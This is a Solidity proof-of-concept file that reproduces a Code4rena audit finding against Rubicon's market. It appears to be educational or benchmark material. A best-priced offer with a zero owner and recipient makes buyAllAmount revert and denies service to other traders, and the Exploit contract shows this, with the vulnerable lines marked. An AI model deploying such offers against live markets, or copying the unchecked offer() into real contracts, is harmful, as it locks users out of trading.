// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Rubicon — [H-12] DOS of market operations with malicious offers
    (Code4rena 2023-04-rubicon; #48951)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: offer() accepts owner/recipient = address(0). OZ-style ERC20
    reverts on transfer to zero. A best-priced unfillable offer bricks
    sellAllAmount / buyAllAmount (and Position which only uses those paths).
    Vulnerable offer path + fill path preserved with @> VULN markers. */

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        // OZ-style: revert on zero address (finding relies on this)
        require(to != address(0), "ERC20: transfer to the zero address");
        require(msg.sender != address(0), "ERC20: transfer from the zero address");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal market: sorted best offer + buyAllAmount that takes best first.
contract RubiconMarket {
    struct OfferInfo {
        uint256 pay_amt;
        address pay_gem;
        uint256 buy_amt;
        address buy_gem;
        address owner;
        address recipient; // payment recipient when filled
    }

    mapping(uint256 => OfferInfo) public offers;
    uint256 public last_offer_id;
    // best price offer for (pay_gem, buy_gem) — head of book
    mapping(address => mapping(address => uint256)) public _best;

    function getBestOffer(address pay_gem, address buy_gem) public view returns (uint256) {
        return _best[pay_gem][buy_gem];
    }

    /// @notice Create offer; NO zero-address sanitization on owner/recipient.
    function offer(
        uint256 pay_amt,
        address pay_gem,
        uint256 buy_amt,
        address buy_gem,
        address owner,
        address recipient
    ) external returns (uint256 id) {
        require(pay_amt > 0 && buy_amt > 0, "dust");
        // @> VULN: owner/recipient may be address(0) — no require(owner != 0)
        // FIX: require(owner != address(0) && recipient != address(0));
        MockERC20(pay_gem).transferFrom(msg.sender, address(this), pay_amt);
        id = ++last_offer_id;
        offers[id] = OfferInfo({
            pay_amt: pay_amt,
            pay_gem: pay_gem,
            buy_amt: buy_amt,
            buy_gem: buy_gem,
            owner: owner,
            recipient: recipient
        });
        // Become best if empty or better price (more pay per buy)
        uint256 cur = _best[pay_gem][buy_gem];
        if (cur == 0) {
            _best[pay_gem][buy_gem] = id;
        } else {
            OfferInfo memory c = offers[cur];
            // better = higher pay_amt/buy_amt
            if (pay_amt * c.buy_amt > c.pay_amt * buy_amt) {
                _best[pay_gem][buy_gem] = id;
            }
        }
    }

    function _fill(uint256 id, uint256 takePayAmt) internal {
        OfferInfo storage o = offers[id];
        require(takePayAmt <= o.pay_amt, "size");
        uint256 payFromTaker = (o.buy_amt * takePayAmt) / o.pay_amt;
        // Payment for the maker goes to recipient (or owner if recipient unset path)
        address recv = o.recipient;
        // @> VULN: transfer to zero recipient reverts → whole buyAllAmount reverts (DoS)
        MockERC20(o.buy_gem).transferFrom(msg.sender, recv, payFromTaker); // @> VULN: zero recipient DoS
        MockERC20(o.pay_gem).transfer(msg.sender, takePayAmt);
        o.pay_amt -= takePayAmt;
        o.buy_amt -= payFromTaker;
        if (o.pay_amt == 0) {
            if (_best[o.pay_gem][o.buy_gem] == id) _best[o.pay_gem][o.buy_gem] = 0;
            delete offers[id];
        }
    }

    /// @notice Fill best offers until buy_amt of buy_gem is acquired.
    function buyAllAmount(
        address buy_gem,
        uint256 buy_amt,
        address pay_gem,
        uint256 /* max_fill */
    ) external returns (uint256 fill_amt) {
        while (buy_amt > 0) {
            uint256 offerId = getBestOffer(buy_gem, pay_gem);
            // finding snippet: require(offerId != 0, "offerId == 0");
            require(offerId != 0, "offerId == 0");
            OfferInfo memory o = offers[offerId];
            if (buy_amt >= o.pay_amt) {
                fill_amt += o.buy_amt;
                buy_amt -= o.pay_amt;
                _fill(offerId, o.pay_amt);
            } else {
                uint256 baux = (buy_amt * o.buy_amt) / o.pay_amt;
                fill_amt += baux;
                _fill(offerId, buy_amt);
                buy_amt = 0;
            }
        }
    }
}

contract Victim {
    RubiconMarket public market;
    MockERC20 public pay;
    MockERC20 public buy;

    constructor(RubiconMarket m, MockERC20 p, MockERC20 b) {
        market = m;
        pay = p;
        buy = b;
    }

    function tryBuy(uint256 buyAmt) external returns (bool ok) {
        pay.approve(address(market), type(uint256).max);
        try market.buyAllAmount(address(buy), buyAmt, address(pay), type(uint256).max) {
            return true;
        } catch {
            return false;
        }
    }
}

contract Exploit {
    MockERC20 public payToken; // CREATE 1
    MockERC20 public buyToken; // CREATE 2
    RubiconMarket public market; // CREATE 3 — vulnerable
    Victim public victim; // CREATE 4

    uint256 public maliciousId;
    bool public marketDoSd;

    constructor() {
        payToken = new MockERC20("Pay", "PAY");
        buyToken = new MockERC20("Buy", "BUY");
        market = new RubiconMarket();
        victim = new Victim(market, payToken, buyToken);

        // Attacker posts a tiny, best-priced unfillable offer (owner=recipient=0)
        buyToken.mint(address(this), 1e18);
        buyToken.approve(address(market), 1e18);
        // Very good price: pay 1e18 buyToken for only 1 wei payToken
        maliciousId = market.offer(
            1e18,
            address(buyToken),
            1, // tiny buy_amt → best price
            address(payToken),
            address(0),
            address(0)
        );

        // Also a legitimate deeper offer that would be fillable if best were skipped
        buyToken.mint(address(this), 50e18);
        buyToken.approve(address(market), 50e18);
        market.offer(50e18, address(buyToken), 50e18, address(payToken), address(this), address(this));

        // Fund victim
        payToken.mint(address(victim), 100e18);
    }

    function run() external {
        // Best offer is the malicious zero-recipient one
        require(market.getBestOffer(address(buyToken), address(payToken)) == maliciousId, "not best");

        // Victim (or Position.buyAllAmount path) tries to buy — reverts on transfer to 0
        bool ok = victim.tryBuy(10e18);
        require(!ok, "buy should fail");
        marketDoSd = true;

        // Harm: market ops bricked; victim still has no buyToken
        require(buyToken.balanceOf(address(victim)) == 0, "victim should not receive");
        require(payToken.balanceOf(address(victim)) == 100e18, "victim funds unused");
        // Malicious offer still sits as best
        require(market.getBestOffer(address(buyToken), address(payToken)) == maliciousId, "still best");
    }
}
